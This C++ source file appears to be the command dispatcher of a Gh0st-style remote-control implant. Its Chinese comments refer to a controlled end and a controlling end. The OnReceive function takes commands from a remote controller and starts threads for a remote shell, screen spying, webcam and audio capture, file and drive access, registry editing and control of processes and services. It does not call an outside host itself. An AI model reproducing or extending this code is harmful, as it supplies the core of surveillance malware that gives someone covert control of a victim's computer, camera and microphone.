// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
{
	m_ulThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	printf("~CKernelManager begin\n");
	int i = 0;
	for (i=0;i<MAX_THREADNUM;++i)
	{
		if (m_hThread[i].h!=0)
		{
			CloseHandle(m_hThread[i].h);
			m_hThread[i].h = NULL;
			m_hThread[i].run = FALSE;
			while (m_hThread[i].p)
				Sleep(50);
		}
	}
	m_ulThreadCount = 0;
	printf("~CKernelManager end\n");
}

// 获取可用的线程下标
UINT CKernelManager::GetAvailableIndex() {
	if (m_ulThreadCount < MAX_THREADNUM) {
		return m_ulThreadCount;
	}

	for (int i = 0; i < MAX_THREADNUM; ++i)
	{
		if (m_hThread[i].p == NULL) {
			return i;
		}
	}
	return -1;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
	if ((m_ulThreadCount = GetAvailableIndex()) == -1) {
		if (!isExit) {
			printf("CKernelManager: The number of threads exceeds the limit.\n");
			return;
		}
	}
	else if (!isExit){
		m_hThread[m_ulThreadCount].p = new IOCPClient(true);
	}

	switch(szBuffer[0])
	{
	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopTalkManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopShellManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopProcessManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;// 被控端退出
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			m_bIsDead = 1;
			OutputDebugStringA("======> Client exit \n");
			break;
		}

	case SERVER_EXIT:
		{
			BYTE	bToken = SERVER_EXIT;// 主控端退出  
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			m_bIsDead = 2;
			OutputDebugStringA("======> Server exit \n");
			break;
		}

	case COMMAND_SCREEN_SPY:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_LIST_DRIVE :
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopFileManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WEBCAM:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_AUDIO:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopServicesManager,
				&m_hThread[m_ulThreadCount], 0, NULL);
			break;
		}

	default:
		{
			OutputDebugStringA("======> Error operator\n");
			char buffer[256] = {};
			strncpy(buffer, (const char*)(szBuffer+1), sizeof(buffer));
			printf("!!! Unknown command: %s\n", buffer);
			if (m_ulThreadCount != -1) {
				delete m_hThread[m_ulThreadCount].p;
				m_hThread[m_ulThreadCount].p = NULL;
			}
			break;
		}
	}
}
